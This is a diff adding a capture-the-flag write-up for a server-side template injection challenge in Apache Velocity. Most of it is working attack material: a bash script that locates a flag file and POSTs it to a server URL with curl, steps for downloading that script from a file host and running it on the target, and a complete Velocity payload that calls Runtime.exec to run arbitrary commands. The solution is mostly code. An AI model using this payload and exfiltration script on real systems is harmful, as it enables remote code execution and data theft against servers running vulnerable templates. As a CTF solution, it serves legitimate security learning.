@@ -1,0 +1,62 @@
+Problem Overview
+
+This problem is a Server side template injection challenge within apache velocity
+
+Solution:
+
+- Upload a flag extraction script to a file host (x0.at)
+
+  - The script searches root for a file named flag.txt
+  - after finding the flag file, echos the contents of the file
+
+  ```bash
+  #!/bin/bash
+
+  search_dir="/"
+
+  file=$(find "$search_dir" -type f -name "flag*.txt")
+
+  if [ -n "$file" ]; then
+    echo "File found: $file"
+    curl -d @/$file -X POST $server_url
+    echo "Flag contents is $(cat $file)"
+  else
+    echo "No file starting with 'flag' found in $search_dir."
+  fi
+  ```
+
+- using [[server side template injection]], download the script on the server
+- using [[server side template injection]] run the script on the server
+- The server side template injection payload was gotten from [this link](https://www.linkedin.com/pulse/apache-velocity-server-side-template-injection-marjan-sterjev/) and is as follows:
+
+```java
+#set($s="")
+#set($stringClass=$s.getClass())
+#set($stringBuilderClass=$stringClass.forName("java.lang.StringBuilder"))
+#set($inputStreamClass=$stringClass.forName("java.io.InputStream"))
+#set($readerClass=$stringClass.forName("java.io.Reader"))
+#set($inputStreamReaderClass=$stringClass.forName("java.io.InputStreamReader"))
+#set($bufferedReaderClass=$stringClass.forName("java.io.BufferedReader"))
+#set($collectorsClass=$stringClass.forName("java.util.stream.Collectors"))
+#set($systemClass=$stringClass.forName("java.lang.System"))
+#set($stringBuilderConstructor=$stringBuilderClass.getConstructor())
+#set($inputStreamReaderConstructor=$inputStreamReaderClass.getConstructor($inputStreamClass))
+#set($bufferedReaderConstructor=$bufferedReaderClass.getConstructor($readerClass))
+
+#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
+#set($process=$runtime.exec("{payload}"))
+#set($null=$process.waitFor() )
+
+#set($inputStream=$process.getInputStream())
+#set($inputStreamReader=$inputStreamReaderConstructor.newInstance($inputStream))
+#set($bufferedReader=$bufferedReaderConstructor.newInstance($inputStreamReader))
+#set($stringBuilder=$stringBuilderConstructor.newInstance())
+
+#set($output=$bufferedReader.lines().collect($collectorsClass.joining($systemClass.lineSeparator())))
+
+$output
+```
+
+Replace payload with the commands to run on the server
+
+- The script will echo the flag contents... so profit
